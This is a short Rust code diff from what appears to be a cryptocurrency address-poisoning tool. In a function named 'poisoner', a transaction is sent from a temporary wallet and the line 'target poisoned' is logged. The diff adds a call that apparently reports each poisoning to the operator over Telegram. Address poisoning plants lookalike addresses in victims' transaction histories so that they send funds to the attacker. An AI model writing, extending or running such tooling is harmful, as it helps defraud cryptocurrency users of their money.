@@ -1,5 +1,6 @@
 use crate::config::Config;
 use crate::providers::{get_http_provider, HttpProvider};
+use crate::telegram::send_outcoming_transaction;
 use crate::utils::get_identifier;
 use alloy::network::EthereumWallet;
 use alloy::primitives::{Address, U256};
@@ -51,4 +52,5 @@ pub(crate) async fn poisoner(
     send_transaction(&temp_provider, &last_to, &value_without_fees).await;
 
     info!("target poisoned | address {:?}", to);
+    send_outcoming_transaction(&config).await;
 }
